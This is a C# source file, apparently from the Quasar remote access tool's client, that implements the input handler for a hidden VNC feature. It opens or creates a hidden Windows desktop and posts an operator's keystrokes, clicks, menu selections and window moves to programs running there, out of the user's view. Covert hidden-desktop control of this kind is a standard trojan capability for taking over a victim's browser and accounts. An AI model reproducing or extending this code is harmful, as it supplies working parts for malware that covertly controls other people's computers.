﻿using Quasar.Common.Enums;
using Quasar.Common.Messages.Monitoring.HVNC;
using Quasar.Common.Messages.Monitoring.RemoteDesktop;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Quasar.Client.Helper.HVNC
{
    public class InputHandler : IDisposable
    {
        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool SetThreadDesktop(IntPtr hDesktop);

        [DllImport("user32.dll")]
        public static extern IntPtr WindowFromPoint(POINT point);

        [DllImport("user32.dll")]
        public static extern IntPtr SendMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr PostMessage(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        public static extern bool ScreenToClient(IntPtr hWnd, ref POINT lpPoint);

        [DllImport("user32.dll")]
        public static extern IntPtr ChildWindowFromPoint(IntPtr hWnd, POINT point);

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll")]
        public static extern bool PtInRect(ref RECT lprc, POINT pt);

        [DllImport("user32.dll")]
        public static extern bool SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

        [DllImport("user32.dll")]
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

        [DllImport("user32.dll")]
        public static extern bool GetWindowPlacement(IntPtr hWnd, ref WINDOWPLACEMENT lpwndpl);

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        public static extern int MenuItemFromPoint(IntPtr hWnd, IntPtr hMenu, POINT pt);

        [DllImport("user32.dll")]
        public static extern int GetMenuItemID(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern IntPtr GetSubMenu(IntPtr hMenu, int nPos);

        [DllImport("user32.dll")]
        public static extern bool MoveWindow(IntPtr hWnd, int x, int y, int width, int height, bool repaint);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);

        public InputHandler(string DesktopName)
        {
            this.DesktopName = DesktopName;
            IntPtr intPtr = InputHandler.OpenDesktop(DesktopName, 0, true, (uint)DESKTOP_ACCESS.GENERIC_ALL);
            if (intPtr == IntPtr.Zero)
            {
                intPtr = InputHandler.CreateDesktop(DesktopName, IntPtr.Zero, IntPtr.Zero, 0, (uint)DESKTOP_ACCESS.GENERIC_ALL, IntPtr.Zero);
            }
            this.Desktop = intPtr;
        }

        public void Dispose()
        {
            InputHandler.CloseDesktop(this.Desktop);
            GC.Collect();
        }

        public static int GET_X_LPARAM(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() & 0xFFFF));
        }

        public static int GET_Y_LPARAM(IntPtr lParam)
        {
            return (int)((short)(lParam.ToInt32() >> 16 & 0xFFFF));
        }

        public static IntPtr MAKELPARAM(int lowWord, int highWord)
        {
            return new IntPtr(highWord << 16 | (lowWord & 0xFFFF));
        }

        public void Input(uint msg, IntPtr wParam, IntPtr lParam)
        {
            lock (lockObject)
            {
                SetThreadDesktop(this.Desktop);
                IntPtr intPtr = IntPtr.Zero;
                bool flag2 = false;
                POINT point;
                if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                {
                    point = this.lastPoint;
                    intPtr = WindowFromPoint(point);
                }
                else
                {
                    flag2 = true;
                    point.x = GET_X_LPARAM(lParam);
                    point.y = GET_Y_LPARAM(lParam);
                    POINT point2 = this.lastPoint;
                    this.lastPoint = point;
                    intPtr = WindowFromPoint(point);
                    if (msg == WM_LBUTTONUP)
                    {
                        this.lmouseDown = false;
                        int num = SendMessage(intPtr, WM_NCHITTEST, IntPtr.Zero, lParam).ToInt32();
                        if (num <= HTMAXBUTTON)
                        {
                            if (num != HTTRANSPARENT)
                            {
                                if (num == HTMINBUTTON)
                                {
                                    Debug.WriteLine("Hit min button");
                                    PostMessage(intPtr, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
                                }
                            }
                            else
                            {
                                Debug.WriteLine("HTTRANSPARENT");
                                SetWindowLong(intPtr, GWL_STYLE, GetWindowLong(intPtr, GWL_STYLE) | WS_DISABLED);
                                IntPtr intPtr2 = SendMessage(intPtr, WM_NCHITTEST, IntPtr.Zero, lParam);
                            }
                        }
                        else if (num != HTMAXBUTTON)
                        {
                            if (num == HTCLOSE)
                            {
                                Debug.WriteLine("Hit close button");
                                PostMessage(intPtr, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                            }
                        }
                        else
                        {
                            WINDOWPLACEMENT windowplacement = default(WINDOWPLACEMENT);
                            windowplacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowplacement);
                            GetWindowPlacement(intPtr, ref windowplacement);
                            if ((windowplacement.flags & SW_SHOWMAXIMIZED) != 0)
                            {
                                Debug.WriteLine("Hit restore button");
                                PostMessage(intPtr, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
                            }
                            else
                            {
                                Debug.WriteLine("Hit maximize button");
                                PostMessage(intPtr, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
                            }
                        }
                    }
                    else if (msg == WM_LBUTTONDOWN)
                    {
                        this.lmouseDown = true;
                        this.hResMoveWindow = IntPtr.Zero;
                        IntPtr hWnd = FindWindow("Button", null);
                        RECT rect;
                        GetWindowRect(hWnd, out rect);
                        if (PtInRect(ref rect, point))
                        {
                            Debug.WriteLine("Hit button");
                            PostMessage(hWnd, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
                            return;
                        }
                        StringBuilder stringBuilder = new StringBuilder(MAX_PATH);
                        RealGetWindowClass(intPtr, stringBuilder, MAX_PATH);
                        if (stringBuilder.ToString() == "#32768")
                        {
                            Debug.WriteLine("Hit menu");
                            IntPtr subMenu = GetSubMenu(intPtr, 0);
                            int num2 = MenuItemFromPoint(IntPtr.Zero, subMenu, point);
                            GetMenuItemID(subMenu, num2);
                            PostMessage(intPtr, MN_GETHMENU, new IntPtr(num2), IntPtr.Zero);
                            PostMessage(intPtr, WM_KEYDOWN, new IntPtr(VK_RETURN), IntPtr.Zero);
                            return;
                        }
                    }
                    else if (msg == WM_MOUSEMOVE && this.lmouseDown)
                    {
                        if (this.hResMoveWindow == IntPtr.Zero)
                        {
                            Debug.WriteLine("Hit move window");
                            this.resMoveType = SendMessage(intPtr, WM_NCHITTEST, IntPtr.Zero, lParam);
                        }
                        else
                        {
                            Debug.WriteLine("Move window");
                            intPtr = this.hResMoveWindow;
                        }
                        int num3 = point2.x - point.x;
                        int num4 = point2.y - point.y;
                        RECT rect2;
                        GetWindowRect(intPtr, out rect2);
                        int num5 = rect2.left;
                        int num6 = rect2.top;
                        int num7 = rect2.right - rect2.left;
                        int num8 = rect2.bottom - rect2.top;
                        switch (this.resMoveType.ToInt32())
                        {
                            case HTCAPTION:
                                num5 -= num3;
                                num6 -= num4;
                                break;
                            case HTLEFT:
                                num5 -= num3;
                                num7 += num3;
                                break;
                            case HTRIGHT:
                                num7 -= num3;
                                break;
                            case HTTOP:
                                num6 -= num4;
                                num8 += num4;
                                break;
                            case HTTOPLEFT:
                                num6 -= num4;
                                num8 += num4;
                                num5 -= num3;
                                num7 += num3;
                                break;
                            case HTTOPRIGHT:
                                num6 -= num4;
                                num8 += num4;
                                num7 -= num3;
                                break;
                            case HTBOTTOM:
                                num8 -= num4;
                                break;
                            case HTBOTTOMLEFT:
                                num8 -= num4;
                                num5 -= num3;
                                num7 += num3;
                                break;
                            case HTBOTTOMRIGHT:
                                num8 -= num4;
                                num7 -= num3;
                                break;
                            default:
                                return;
                        }
                        Debug.WriteLine("Move window to " + num5 + " " + num6 + " " + num7 + " " + num8);
                        MoveWindow(intPtr, num5, num6, num7, num8, false);
                        this.hResMoveWindow = intPtr;
                        return;
                    }
                }
                IntPtr intPtr3 = intPtr;
                do
                {
                    intPtr = intPtr3;
                    ScreenToClient(intPtr, ref point);
                    intPtr3 = ChildWindowFromPoint(intPtr, point);
                }
                while (!(intPtr3 == IntPtr.Zero) && !(intPtr3 == intPtr));
                if (flag2)
                {
                    lParam = MAKELPARAM(point.x, point.y);
                }
                PostMessage(intPtr, msg, wParam, lParam);
            }
        }

        private const int GWL_STYLE = -16;
        private const int WS_DISABLED = 0x8000000;
        private const int WM_CHAR = 0x0102;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_LBUTTONUP = 0x0202;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_MOUSEMOVE = 0x0200;
        private const int WM_CLOSE = 0x0010;
        private const int WM_SYSCOMMAND = 0x0112;
        private const int SC_MINIMIZE = 0xF020;
        private const int SC_RESTORE = 0xF120;
        private const int SC_MAXIMIZE = 0xF030;
        private const int HTCAPTION = 2;
        private const int HTTOP = 12;
        private const int HTBOTTOM = 15;
        private const int HTLEFT = 10;
        private const int HTRIGHT = 11;
        private const int HTTOPLEFT = 13;
        private const int HTTOPRIGHT = 14;
        private const int HTBOTTOMLEFT = 16;
        private const int HTBOTTOMRIGHT = 17;
        private const int HTCLOSE = 20;
        private const int HTMINBUTTON = 8;
        private const int HTMAXBUTTON = 9;
        private const int HTTRANSPARENT = -1;
        private const int VK_RETURN = 0x0D;
        private const int MN_GETHMENU = 0x01E1;
        private const int BM_CLICK = 0x00F5;
        private const int MAX_PATH = 260;
        private const int WM_NCHITTEST = 0x0084;
        private const int SW_SHOWMAXIMIZED = 3;

        private POINT lastPoint = new POINT { x = 0, y = 0 };
        private IntPtr hResMoveWindow = IntPtr.Zero;
        private IntPtr resMoveType = IntPtr.Zero;
        private bool lmouseDown;
        private static object lockObject = new object();
        private string DesktopName;
        public IntPtr Desktop = IntPtr.Zero;

        private enum DESKTOP_ACCESS : uint
        {
            DESKTOP_NONE,
            DESKTOP_READOBJECTS,
            DESKTOP_CREATEWINDOW,
            DESKTOP_CREATEMENU = 4U,
            DESKTOP_HOOKCONTROL = 8U,
            DESKTOP_JOURNALRECORD = 16U,
            DESKTOP_JOURNALPLAYBACK = 32U,
            DESKTOP_ENUMERATE = 64U,
            DESKTOP_WRITEOBJECTS = 128U,
            DESKTOP_SWITCHDESKTOP = 256U,
            GENERIC_ALL = 511U
        }

        public struct POINT
        {
            public int x;
            public int y;
        }

        public struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        public struct WINDOWPLACEMENT
        {
            public int length;
            public int flags;
            public int showCmd;
            public POINT ptMinPosition;
            public POINT ptMaxPosition;
            public RECT rcNormalPosition;
        }
    }
}
